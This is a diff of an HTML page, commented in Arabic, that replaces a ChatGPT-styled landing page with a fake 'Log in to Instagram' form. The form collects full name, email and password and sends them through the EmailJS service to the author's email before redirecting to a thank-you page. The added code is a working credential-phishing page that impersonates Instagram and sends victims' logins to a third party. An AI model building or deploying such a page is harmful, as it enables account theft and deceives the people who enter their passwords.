@@ -3,64 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ChatGPT - Style Page</title>
+    <title>Login Page - Instagram Style</title>
     <link rel="stylesheet" href="styles.css">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2; /* لون الخلفية */
-            margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
+            background-color: #fafafa; /* لون خلفية الصفحة */
+            font-family: Arial, sans-serif;
         }
 
-        .container {
+        main {
             background-color: #ffffff; /* لون خلفية الحاوية */
             padding: 40px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* ظل */
-            width: 400px; /* عرض الحاوية */
+            width: 350px; /* عرض الحاوية */
             text-align: center;
         }
 
         h1 {
-            font-size: 24px;
-            color: #333333; /* لون العنوان الرئيسي */
+            font-size: 26px;
             margin-bottom: 20px;
+            color: #262626; /* لون العنوان الرئيسي */
         }
 
-        p {
-            color: #666666; /* لون النص الفرعي */
-            line-height: 1.6;
-            margin-bottom: 20px;
+        form {
+            text-align: left;
         }
 
-        .button {
-            display: inline-block;
-            padding: 12px 30px;
-            background-color: #4CAF50; /* لون الزر */
-            color: white;
-            text-decoration: none;
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #262626; /* لون النص */
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #dbdbdb; /* لون الحدود */
             border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #3897f0; /* لون زر تسجيل الدخول */
+            color: #ffffff;
+            text-decoration: none;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
             transition: background-color 0.3s ease;
         }
 
-        .button:hover {
-            background-color: #45a049; /* لون الزر عند التحويم */
+        button[type="submit"]:hover {
+            background-color: #1675c1; /* لون الزر عند التحويم */
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("5eIVIFEyplQrYKk0l"); // معرّف المستخدم الخاص بك (Public API Key)
+        })();
+        
+        function sendEmail(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_tix42ge', 'template_kutj2z9', event.target) // استبدل معرف الخدمة ومعرف القالب المناسبين
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    window.location.href = 'thankyou.html';
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        }
+    </script>
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome to ChatGPT</h1>
-        <p>Start chatting with ChatGPT, your friendly AI assistant.</p>
-        <a href="#" class="button">Chat Now</a>
-    </div>
+    <main>
+        <h1>Log in to Instagram</h1>
+        <form onsubmit="sendEmail(event)">
+            <label for="fullname">Full Name:</label>
+            <input type="text" id="fullname" name="fullname" autocomplete="name" required><br>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" autocomplete="email" required><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" autocomplete="new-password" required><br>
+            <button type="submit">Log In</button>
+        </form>
+    </main>
 </body>
 </html>
+
 
 
 
